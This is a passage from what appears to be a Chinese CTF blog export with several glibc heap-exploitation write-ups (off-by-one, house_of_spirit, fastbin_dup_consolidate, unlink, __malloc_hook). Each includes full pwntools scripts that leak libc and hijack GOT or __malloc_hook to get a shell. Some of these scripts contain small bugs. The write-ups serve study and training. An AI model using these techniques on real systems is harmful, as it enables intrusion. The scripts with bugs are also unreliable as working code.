&#125; *v1++ = v4; &#125; *v1 = 0; //off by one return v0;&#125; ​ 先来跑一遍程序看看： ​ 根据以下heap结构以及ida的静态分析可以看出，每执行一次PUT，系统会分配三个连续的chunk。a.row 结构体(0x40) b.row key(0x20) c.row data(size)。结构体中存有指向key和data的指针。 B. Memory Arrangement​ 1.malloc出需要的chunk 123456a = malloc(0x200); //unsort chunk,b = malloc(0x50); //overlap chunk，leak libc_basec = malloc(0x68); //修改其fd，用于fast attackd = malloc(0x1f8); //溢出chunk，修改下一chunk的pre_size和in_use字节（用到了off_by_one漏洞）e = malloc(0xf0); //victim chunk，被溢出chunkbarrier = malloc(0x400) //确保以上chunk不被top chunk合并。 ​ 2.把a，c，d三个chunk释放。 ​ 3.因为DEL函数也用到了read_in 函数，也可以进行溢出，所以这里DEL(payload)，payload大小为0x1f8，而chunk_d实际可写大小只有0x1f0，因此可以在payload的最后写入fake_pre_size，同时覆写了chunk_e的pre_size和in_use字节。 ​ 4.现在释放chunk_e，系统将寻址至chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,系统将chunk_a unlink，然后合并a到e的所有内存，并入一个unsort chunk。 ​ 5.而chunk_b还在使用，造成了overlap。 ​ 6.接下来malloc(0x200)两次，第一次是把原来释放的chunk_a分配出来，第二次是在后来被系统合并的大chunk中割下0x210的空间，然后这个大chunk的地址将和chunk_b重合。由于只有大chunk一个unsort chunk在bin中，因此其fd，bk指向main_arena，于是可以溢出了。 C. Leak Libc_base &amp; get shell​ 1.GET(chunk_b)并通过计算可以得到libc_base，同时也可以算出malloc_hook的地址。 ​ 2.用one_gadget得到libc中excute(“/bin/sh”);的地址 ​ 3.malloc(0x100)，可以得到chunk_b到chunk_b + 0x100的内存，用来填充chunk_b，并用malloc_hook的上方地址覆写chunk_c的fd。 ​ 4.malloc两次，以malloc_hook上方地址为首地址的chunk，写入one_gadget到malloc_hook，完事儿。。 D . Exploit​ 脚本还是得参考CTF-Wiki，自己真是肝不出来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#! /usr/bin/env python2# -*- coding: utf-8 -*-# vim:fenc=utf-8import sysimport osimport os.pathfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)if len(sys.argv) &gt; 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT)else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) # ubuntu 16.04def cmd(command_num): p.recvuntil(&#x27;command:&#x27;) p.sendline(str(command_num))def put(key, size, data): cmd(&#x27;PUT&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;size:&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;data:&#x27;) if len(data) &lt; size: p.send(data.ljust(size, &#x27;\\x00&#x27;)) else: p.send(data)def delete(key): cmd(&#x27;DEL&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key)def get(key): cmd(&#x27;GET&#x27;) p.recvuntil(&#x27;key:&#x27;) p.sendline(key) p.recvuntil(&#x27;[&#x27;) num = int(p.recvuntil(&#x27; bytes&#x27;).strip(&#x27; bytes&#x27;)) p.recvuntil(&#x27;:\\n&#x27;) return p.recv(num)def main(): # avoid complicity of structure malloc for i in range(10): put(str(i), 0x38, str(i)) for i in range(10): delete(str(i)) # allocate what we want in order put(&#x27;1&#x27;, 0x200, &#x27;1&#x27;) put(&#x27;2&#x27;, 0x50, &#x27;2&#x27;) put(&#x27;5&#x27;, 0x68, &#x27;6&#x27;) put(&#x27;3&#x27;, 0x1f8, &#x27;3&#x27;) put(&#x27;4&#x27;, 0xf0, &#x27;4&#x27;) put(&#x27;defense&#x27;, 0x400, &#x27;defense-data&#x27;) # free those need to be freed delete(&#x27;5&#x27;) delete(&#x27;3&#x27;) delete(&#x27;1&#x27;) delete(&#x27;a&#x27; * 0x1f0 + p64(0x4e0)) delete(&#x27;4&#x27;) put(&#x27;0x200&#x27;, 0x200, &#x27;fillup&#x27;) put(&#x27;0x200 fillup&#x27;, 0x200, &#x27;fillup again&#x27;) libc_leak = u64(get(&#x27;2&#x27;)[:6].ljust(8, &#x27;\\x00&#x27;)) p.info(&#x27;libc leak: 0x%x&#x27; % libc_leak) libc_base = libc_leak - 0x3c4b78 p.info(&#x27;libc_base: 0x%x&#x27; % libc_base) put(&#x27;fastatk&#x27;, 0x100, &#x27;a&#x27; * 0x58 + p64(0x71) + p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x10 + 5 - 8)) put(&#x27;prepare&#x27;, 0x68, &#x27;prepare data&#x27;) one_gadget = libc_base + 0x4526a put(&#x27;attack&#x27;, 0x68, &#x27;a&#x27; * 3 + p64(one_gadget)) p.sendline(&#x27;DEL&#x27;) # malloc(8) triggers one_gadget p.interactive()if __name__ == &#x27;__main__&#x27;: main() ​ ps.不过有一个地方一直没弄明白：前面说的每一次PUT都会mallc()3次，而且理应是连续地址的三个chunk，但是CTF-Wiki的解法，以及各种其他师傅的解法都只考虑了data chunk，我和刘老板倒是考虑了三个chunk连续的情况，但是我没整出来。暂时先按照writeup的来吧。。之后再回头看看。","categories":[],"tags":[]},{"title":"House_of_spirit","slug":"house-of-spirit","date":"2020-03-06T10:43:46.000Z","updated":"2021-03-23T08:37:54.589Z","comments":true,"path":"2020/03/06/house-of-spirit/","link":"","permalink":"http://example.com/2020/03/06/house-of-spirit/","excerpt":"​ Fastbin Attack 中的 house_of_spirit。 (精神家园？？)","text":"​ Fastbin Attack 中的 house_of_spirit。 (精神家园？？) 0x00 . house_of_spirit​ 按照惯例。。。看看how2heap的代码： 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\\n&quot;, malloc(0x30));&#125; ​ 说实话，这个代码看得脑壳疼，没完全看懂。 ​ 大概的攻击思路就是，找一个可控的区域，比如栈，bss段，可读可写的，在此区域写一个fake fast chunk，然后想办法free掉，这么一来就掉进了fastbin里面。因为fake fast chunk在链表头(main_arena指向)，所以malloc后fake chunk会直接分配出来，然后就可以任意读写随意浪了。 0x01 . oreo 🍪A . ELF Analysis​ 明明是个买枪的程序。。。为啥叫奥利奥 ​ 花里胡哨的最喜欢了😬😬😬 ​ 主要函数如下 ​ add函数里可以发现，程序添加chunk时，会形成这样的一种链表结构： ​ 并且存在明显的溢出，所以可以估摸着覆盖掉next指针。 ​ show()：展示所有订单的description和name。 ​ order()：下单，并删除前面所有chunk。 ​ leave()：在订单中备注，用到了message指针(bss段)，而message指针在程序开头就指向了message_ptr。 ​ stats()：输出订单数和备注数以及最近一次备注内容，可以用作输出。 ​ 程序中用到的许多重要指针都能在bss段找到： B . Main ideas 💡 堆溢出构造链表，Leak libc_base。 伪造fake chunk，并且绕过检测 Getshell C . Step by Step1.Leak libc_base 新建一个chunk，通过溢出使得其next指针指向puts@got show()查看所有chunk的内容，得到puts_addr 通过计算得到libc_base，system@got。 2.Arrange fake chunk 循环新建chunk，当count_in_add == 0x3f，退出循环。 此时再新建一个chunk构造fake chunk。此时count_in_add == 0x40，我们可以将其用作fake chunk size fake chunk结构如下： 把fake chunk的next chunk的pre_size也给改了，就能绕过测试了。 万事俱备，用order()来free掉整个链表，然后main_arena就指向了最后的fake chunk。 3.Getshell 现在我们add()就能得到fake chunk，再在里面写入fgets@got，也就是写入到了fake chunk的fd位置。fgets@got在菜单循环的switch的参数函数中会用到。而红色箭头位置就是我们要写入“/bin/sh”的地儿。 这时再用leave()函数，修改message。注意此时message与fake chunk的fd是同一地址，上面的fake chunk结构图比较清楚。将message中内容(fgets@got)改成system@got。 现在直接送入”/bin/sh\\x00”就行啦。 D . Exploit1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *p = process(&#x27;./oreo&#x27;)elf = ELF(&#x27;./oreo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def add(des,name): p.sendlineafter(&quot;Action: &quot;,str(1)) p.sendlineafter(&quot;Rifle name: &quot;,name) p.sendlineafter(&quot;Rifle description: &quot;,des)def show(): p.sendlineafter(&quot;Action: &quot;,str(2)) p.recvuntil(&quot;===================================&quot;)def order(): p.sendlineafter(&quot;Action: &quot;,str(3)) p.recvuntill(&quot;Okay order submitted!&quot;)def leave(message): p.sendlineafter(&quot;Action: &quot;,str(4)) p.sendlineafter(&quot;your order:&quot;,message)def stats(): p.sendlineafter(&quot;Action: &quot;,str(5))puts_got = elf.gots[puts]free_got = elf.gots[free]puts_offset = libc.symbols[puts]system_offset = libc.symbols[system]#========================Leak libc base============================payload = 27 * &#x27;X&#x27; + p32(puts_got) #so the next chunk we could recv puts_gotadd(&quot;Nothing&quot;,payload)show()p.recvuntil(&quot;===================================&quot;)p.recvuntil(&quot;Description: &quot;)puts_plt = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4]) #got the ture addr of putslibc_base = puts_plt - puts_offsetsystem_addr = libc_base + system_offset#========================Arrange fake chunk==========================num = 1while num&lt;3f : #System will break the circle while num (count_in_add) == 3f add(str(num),&quot;gun&quot;+str(num)) num++payload = 27 * &#x27;X&#x27; + p32(0x0804A2A8) #But 0x0804A2A8(massage) is now saving the message_ptradd(&quot;Nothing&quot;,payload) #count_in_add == 0x40,so it can be used as the size of fake_chunkpayload = 0x20 * &#x27;X&#x27; + p32(0x40)leave(payload) #now the fake_chunk is in the link_list and able to bypass the testorder() #delete the linklist,so the fake_chunk is in the fastbin now#============================Getshell=============================fgets_got = elf.got[fgets]add(fgets_got,&quot;Nothing&quot;) #the fake_chunk was malloced since it is in the bin_topleave(system_addr) #fgets_got was changed to system_addrp.sendline(&quot;/bin/sh\\x00&quot;) #fgets(&quot;/bin/sh&quot;) &lt;====&gt; system(&quot;/bin/sh&quot;)p.interactive()","categories":[],"tags":[]},{"title":"SleepHolder","slug":"SleepHolder","date":"2020-03-03T05:43:46.000Z","updated":"2021-03-23T08:38:58.051Z","comments":true,"path":"2020/03/03/SleepHolder/","link":"","permalink":"http://example.com/2020/03/03/SleepHolder/","excerpt":"​ 关于fastbin_dup_consolidate，以及unlink的另一题。","text":"​ 关于fastbin_dup_consolidate，以及unlink的另一题。 ​ 今天做题还挺快，毕竟是之前已经研究过一点的题目。 0x00 . fastbin_dup_consolidate​ 贴一下代码作为例子。。(code from how2heap) 1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;stdlib.h&gt;int main() &#123; void p1 = malloc(0x40); void p2 = malloc(0x40); fprintf(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2); fprintf(stderr, Now free p1!n); free(p1); void p3 = malloc(0x400); fprintf(stderr, Allocated large bin to trigger malloc_consolidate() p3=%pn, p3); fprintf(stderr, In malloc_consolidate(), p1 is moved to the unsorted bin.n); free(p1); fprintf(stderr, Trigger the double free vulnerability!n); fprintf(stderr, We can pass the check in malloc() since p1 is not fast top.n); fprintf(stderr, Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice %p %pn, malloc(0x40), malloc(0x40));&#125; ​ 代码说明了两件事： ​ 1、要实现double并非只能用释放堆块来掩护：free(1);free(2);free(1);还可以申请堆块来掩护：free(1);malloc(2);free(1); ​ 2、系统在分配large chunk的时候会调用malloc_consolidate()，这个函数相当于free()，就是一个回收函数，主要功能是将fastbin中的chunk整理一下，能合并就合并，不能合并也清除一下使用标志位(inuse = 0)，然后全部丢到unsort bin里面。 ​ 3、所以如果再malloc()一次，就可以多free(1)一次，因为人家本来也不在fast bin，而且也不被top chunk所指。 0x01 . SleepyHolder Write UpA . 分析程序​ 运行看看效果： 1234567891011121314151617181920212223242526272829303132Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1. Keep secret2. Wipe secret3. Renew secret1What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever1Tell me your secret: AAAAAA1. Keep secret2. Wipe secret3. Renew secret3Which Secret do you want to renew?1. Small secret2. Big secret1Tell me your secret: Small1. Keep secret2. Wipe secret3. Renew secret2Which Secret do you want to wipe?1. Small secret2. Big secret1 ​ 看看保护和文件格式： ​ 主要函数如下，除此之外本程序中的alarm()也需要keypatch掉。 ​ 分析主要函数： ​ Add():只允许分配small,big,huge三种secret，每种只能分配一次，而且huge只要分配过后，就不再允许使用huge secret了。另外，这三种secret的指针都位于bss段，是全局变量。 ​ Wipe():free()时未检查指针是否为空，存在Double free漏洞。 ​ Renew():输入限制大小，不可堆溢出。因此构造和输入payload时都要根据secret大小来选择。 ​ 另外程序中没有找到输出函数，大致方向还是修改got表，puts(func@plt)，计算偏移得到libc，再getshell。 B . 内存布局 申请small chunk和big chunk，然后释放small chunk。 申请huge chunk，此时由于malloc_consolidate()，small chunk被丢进unsort bin。 再释放small chunk，又把small chunk丢进fast bin。double free。 small chunk构造fake_chunk，并修改big chunk的标志位，欺骗系统相信fake chunk已经free，需要合并。 此时释放big chunk，系统会使其与small_chunk里面的fake_chunk合并，导致unlink。 此时写入fake chunk中的指针成功偏移。 C . Leak &amp; Getshell 通过small_ptr把big_ptr、small_ptr和3个标志位分别改成atoi@plt，free@got，和1。 renew(1)将puts@got写入small_ptr，其实是覆写了free@got。 free(2)相当于puts(atoi@plt)，通过计算可以透出libc地址啦。 现在我们已经成功透到了libc的地址，通过计算可以得到system地址了。 renew(1)将system_addr写入到small_ptr，其实也是覆写了free@got。 renew(2)将”/bin/sh\\x00”写入到big_ptr待用。 现在只要wipe(2)，实际上就是getshell咯(。・∀・)ノ。 D . Exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *p = process(&#x27;./SleepyHolder&#x27;)elf = ELF(&#x27;./SleepyHolder&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)small_ptr = 0x06020D0free_addr = elf.got[free]puts_addr = elf.got[puts]puts_plt = elf.plt[puts]atoi_addr = elf.got[atoi]atoi_offset = libc.symbols[atoi]system_offset = libc.symbols[system]def add(index,content): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(1)) p.recvuntil(&quot;\\n&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:\\n&quot;) p.send(content)def wipe(index): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(2)) p.recvuntill(&quot;2. Big secret\\n&quot;) p.send(str(index))def renew(index,content): p.recvuntill(&quot;3. Renew secret&quot;) p.send(str(3)) p.recvuntill(&quot;2. Big secret&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:&quot;) p.send(content)#=======================Memory Arrange=======================add(1,&quot;AAAAAAAA&quot;)add(2,&quot;BBBBBBBB&quot;)wipe(1)add(3,&quot;CCCCCCCCC&quot;) #triger malloc_consolidate()wipe(1) #double freefake_chunk =p64(0)*2 #chunk header is uselessfake_chunk+=p64(small_ptr-0x18) #unlink ptrfake_chunk+=p64(small_ptr-0x10) #unlink ptr toofake_chunk+=p64(0x20) #made chunk2 believe that chunk1is free to triger unlinkadd(1,fake_chunk) #now we can move the small_ptr laterwipe(2) #triger the unlink#============================ Leak ===========================payload = &#x27;A&#x27;*8payload+=atoi_addr #big_chunk = atoi@gotpayload+=&#x27;A&#x27;*8 #the huge_ptr is useless anywaypayload+=free_addr #small_chunk = free@gotpayload+=p64(1)*3 #insure 3 flags == 1renew(1,payload) #change the chunk_ptr to gotrenew(1,puts_plt) #change free_addr to puts_pltwipe(2) #free(big_ptr) &lt;----&gt; puts(puts_plt)#=========================== GetShell ========================libc_base = u64(p.recvn(6).ljust(8,&#x27;/x00&#x27;)) - atoi_offsetsystem_addr = libc_base + system_offsetrenew(1,p64(system_addr))renew(2,&quot;/bin/sh\\x00&quot;)free(2)p.interactive()","categories":[],"tags":[]},{"title":"Unlink(stkof)","slug":"Unlink-stkof","date":"2020-03-02T12:57:20.000Z","updated":"2021-03-23T08:39:53.668Z","comments":true,"path":"2020/03/02/Unlink-stkof/","link":"","permalink":"http://example.com/2020/03/02/Unlink-stkof/","excerpt":"​ 关于unlink的介绍和入门。。。。","text":"​ 关于unlink的介绍和入门。。。。 ​ unlink也是一个看了好久看不懂的东西，今天算是整明白了。 0x00 . unlink 漏洞A . unlink原理​ 假设有如下chunk0，chunk1，其中chunk0是使用中的small，chunk1是已释放的small chunk，两者在内存上相邻。 ​ 由于chunk1已释放，所以位于small bin链表中，又与chunk2，chunk3在链表结构上相邻。 ​ 此时如果free(chunk0)，glibc机制就会判断前后(内存上)有无相邻的已释放chunk，如果有，就和chunk0一同合并成一个大chunk。而与此同时，还要把chunk1从small bin中“拔出来”，其中发生的断链，修改链表的操作就是unlink。换言之unlink就是一个从双向链表中抽出一个chunk的操作。（photo from ctf-wiki） ​ ​ 所以unlink只适用于非fast chunk，因为fast chunk不存在双向链表，同时fast chunk也并不是用完就马上回收的。 B . 历史的漏洞利用（32 bit）​ 那么如何通过unlink达到任意写的目的呢？曾经的unlink利用是这样的： ​ ​ 1.在进行unlink之前修改chunk0的fd和bk，使得FD = target_addr，BK = expect value（可以通过堆溢出或其他漏洞修改，或者构造fake chunk）。 ​ 2.进行合并操作，需要将chunk1的前驱后继的指向修改一下，改成chunk0的前驱后继，也就是将chunk1的FD和BK改成chunk0的FD和BK，在一起总要一条心嘛。 ​ 3.此时chunk1已经FD写入了target_addr，BK写入了expect value，在释放chunk0，使得chunk1进行unlink。 ​ 4.chunk1的unlink，实际上就是修改small bin中的前驱后继，将前驱的后继（原本是chunk1）改成自己的后继，将后继的前驱（原本是chunk1）改成自己的前驱。而系统是怎么修改前驱后继的呢，就是修改FD指针 + 8的地址（heap head 占8个字节，紧接着就是该chunk的fd指针）和修改FD指针 + 12的地址（heap head占8 Bytes，fd占4 Bytes，紧接着就是该chunk的bk指针）。 ​ 5.所以系统会将chunk1的FD–&gt;bk改成自己的BK，将BK–&gt;fd改成自己的FD，换句话说就是。 12FD-&gt;bk=BK; //target_addr - 12 + 12 = expect value;BK-&gt;fd=FD; //expect value + 8 = target_addr; ​ 这样就实现了任意写。 C . 如今的漏洞利用 （64 bit）​ 但是现在的glibc加强了保护机制，增加了以下检查过程。 123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ ​ 也就是说，必须使得chunk1前驱的后继，和后继的前驱都指向同一个p。至于p是啥，正常情况下当然是chunk1咯，但是既然要漏洞利用，那当然不能顺着系统机制来。 ​ 我们进行如下构造： 12chunk1-&gt;FD = p - 0x18;chunk1-&gt;BK = p - 0x10; ​ 那么系统检查时就会进行如下判断： 12chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ; //bingo!! p - 0x18 + 0x18 == p - 0x10 +0x10; // We pass!! ​ 既然检查过了，就进行unlink吧。 12chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK; //p - 0x18 + 0x18 = p - 0x10chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD; //p - 0x10 + 0x10 = p - 0x18 ​ 也就是说，我们把p指针向前偏移了0x18。虽然不算是任意写，但也足够利用了。 0x01 . stkof writeupA . 程序分析 ​ useless()的功能大概是用来测试用户输出的chunk序号是否已分配，仅此而已。在主函数里没有找到可以输出的函数，所以可以考虑覆写got表来leak libc。 ​ 至于其他函数： add()没什么特别的。 delete()中free()后未将指针置空 fill()中再让用户输入一遍size，不同于add()中的size，因此可以堆溢出。 ​ 在本程序的几个重要函数中可以可以发现，chunk的堆指针被存放在了一个数组s[ ]中，而双击数组s可以发现，其地址是0x0602140，它是一个位于bss段的指针数组，换言之是一个可写的全局变量。s是我们覆写got表的关键。 ​ 有全局变量存在，可以利用unlink漏洞覆写got表了。 B .内存布局 申请4个chunk，其中chunk2是small chunk。（本程序没有申请限制，可以申请多一点，只要方便布局。） 用chunk1的堆溢出覆盖chunk2，改写其FD和BK成s[0]-0x10(即chunk2指针)，改写chunk3的头信息。 在上一步完成的同时要通过检查，使系统在释放chunk3时相信chunk2也已经释放了，从而向前合并。 这一合并不要紧，系统一不小心就把chunk2处的存放的指针向低地址偏移了0x18，够我们地肆无忌惮发挥了。 C . Leak &amp; Getshell 再改写chunk2的内容，实际上就是覆写s数组，改写chunk指针。此时可写入got表地址了。 覆写情况：s[0]=free@got,s[1]=puts@got,s[2]=atol@got。 再利用fill函数将free@got改成puts@got，free[1]就得到了puts@plt。 通过计算，得到libc地址和system地址，通过elf文件搜索可以找到“/bin/sh”。 利用fil将atol@got改写成system地址。 最后直接发送”/bin/sh”都会调用system函数，getshell。 D . Exp​ 贴一下脚本呗，虽然不是自己写的。（exp from ctf-wiki）有空再自己写一遍。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]if args[&#x27;DEBUG&#x27;]: context.log_level = &#x27;debug&#x27;context.binary = &quot;./stkof&quot;stkof = ELF(&#x27;./stkof&#x27;)if args[&#x27;REMOTE&#x27;]: p = remote(&#x27;127.0.0.1&#x27;, 7777)else: p = process(&quot;./stkof&quot;)log.info(&#x27;PID: &#x27; + str(proc.pidof(p)[0]))libc = ELF(&#x27;./libc.so.6&#x27;)head = 0x602140def alloc(size): p.sendline(&#x27;1&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;OK\\n&#x27;)def edit(idx, size, content): p.sendline(&#x27;2&#x27;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&#x27;OK\\n&#x27;)def free(idx): p.sendline(&#x27;3&#x27;) p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 # begin alloc(0x30) # idx 2 # small chunk size in order to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who&#x27;s size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) # overwrite global[3]&#x27;s chunk&#x27;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil(&#x27;OK\\n&#x27;) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &#x27;a&#x27; * 8 + p64(stkof.got[&#x27;free&#x27;]) + p64(stkof.got[&#x27;puts&#x27;]) + p64( stkof.got[&#x27;atoi&#x27;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt[&#x27;puts&#x27;]) edit(0, len(payload), payload) # free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&#x27;\\nOK\\n&#x27;, drop=True).ljust(8, &#x27;\\x00&#x27;) puts_addr = u64(puts_addr) log.success(&#x27;puts addr: &#x27; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;] binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;)) system_addr = libc_base + libc.symbols[&#x27;system&#x27;] log.success(&#x27;libc base: &#x27; + hex(libc_base)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh_addr)) log.success(&#x27;system addr: &#x27; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp()","categories":[],"tags":[]},{"title":"Malloc_Hook小记","slug":"Malloc-Hook","date":"2020-03-01T07:09:47.000Z","updated":"2021-03-23T08:38:18.513Z","comments":true,"path":"2020/03/01/Malloc-Hook/","link":"","permalink":"http://example.com/2020/03/01/Malloc-Hook/","excerpt":"​ malloc_hook的介绍以及用堆进行malloc_hook攻击。","text":"​ malloc_hook的介绍以及用堆进行malloc_hook攻击。 ​ 昨天的babyheap算是碰上的第一个malloc_hook利用，而且看这么简单的偏移都看不明白，还是记一下吧。 0x00 关于malloc_hook​ malloc_hook是一个位于main_arena附近的函数指针。 ​ 当系统调用malloc，free函数时，会对此指针进行检查，如果指针非空则跳转到该地址并执行。所以，将shellcode或者system(“/bin/sh”)的地址写入到malloc_hook中再想办法调用是一个比较常见的getshell思路。 0x01 malloc_hook位置​ malloc_hook位于main_arena(如果不知道main_arena地址可以直接使用命令 x/20xg &amp;main_arena 查看内存和地址)往上，offset = 0x10: ​ 一般来说malloc_hook为空，但是有一次偶然发现了malloc_hook未被攻击却有值，后来才发现是程序还没有初始化。 0x03 malloc_hook攻击A.如何写入​ 如果程序中存在任意写的漏洞，则用户可以很容易的进行malloc_hook攻击。这里用堆做一个实例（实际上也通常用堆）。就fastbin attack来说，如果我们改写chunk的fd，使其指向malloc_hook上方一定偏移处，就可以填充并写入malloc_hook。所以问题的关键就是我们要在哪儿创建堆，创建多大的堆，如何填充数据。 B.用堆getshell​ 1.首先我们需要知道，创建堆时填充数据的位置在chunk_ptr + 0x10（即free chunk的FD BK指针处）的位置，而前面0x10用来存放堆结构的部分信息，其中很重要的一个信息就是chunk_size。在创建堆时chunk_size是避免检查，决定填充偏移的关键。 ​ 2.由此我们需要在malloc_hook附近找一个合适的“chunk_size”，也就是说，用该地址处的数据充当chunk_size，而且要让其满足fastchunk的大小。经过实验，可以找到main_ arena - 0x40 + 0xd 这个位置（不理解的话可以0x0 – 0x10 都试一下，找最合适的偏移）。 ​ 在此偏移处的0x7f这个字节恰好满足需求，属于fastchunk。所以我们可以在这个地址malloc（0x60），系统就会给我们分配0x70的空间，也满足0x7f的chunksize。 ​ 3.申请好chunk之后，我们还需要知道偏移量。假设我们已经leak出了libc_base，那么就可以根据main_arena在libc上的固定偏移并通过计算得知以下关系： 1234567main_arena == libc_base + 0x3c4b20 chunk_addr == main_arena - 0x40 + 0xdchunk_addr == libc_base + 0x3c4b20 - 0x40 + 0xdchunk_addr == libc_base + 0x3c4aedmalloc_hook== main_arena - 0x10fill_size == malloc_hook - chunk_addrfill_size == 0x23 ​ 所以说我们需要填充的大小就是0x23。 123payload = &#x27;A&#x27; * 3payload +=p64(0)payload +=p64(shellcode) ​ 4.填充好之后，再进行一次malloc()就可以getshell了。","categories":[],"tags":[]},{"title":"Fastbin attack (Babyheap)","slug":"Fastbin attack - Babyheap","date":"2020-02-29T13:09:47.000Z","updated":"2021-03-23T08:37:24.440Z","comments":true,"path":"2020/02/29/Fastbin attack - Babyheap/","link":"","permalink":"http://example.com/2020/02/29/Fastbin%20attack%20-%20Babyheap/","excerpt":"​ 新手肝babyheap要掉多少头发😑（malloc_hook的偏移我居然看了那么久。。）","text":"​ 新手肝babyheap要掉多少头发😑（malloc_hook的偏移我居然看了那么久。。） 1.关于Fast_bin​ fast bin和其他的bin一样，都是一种用来记录free chunk的链表数据结构有单链表有双链表，因种类不同功能不同而采用不同的结构。fast bin专门使用于存放比较小的chunk，具体为16 bytes – 80 bytes（此处指malloc的实际大小）fast bin的设计初衷就是进行快速的小内存分配和释放，因此fast chunk之间是不进行合并的，即不存在unlink。因此其 next_chunk 的 prev_inuse 位也不会被清空。，也就催生了fast bin的漏洞。 2.babyheap复现A.题目分析 Link – https://uaf.io/assets/0ctfbabyheap 常规操作：丢ubuntu分析：保护全开，一般都是堆题。。 丢ida_64分析： 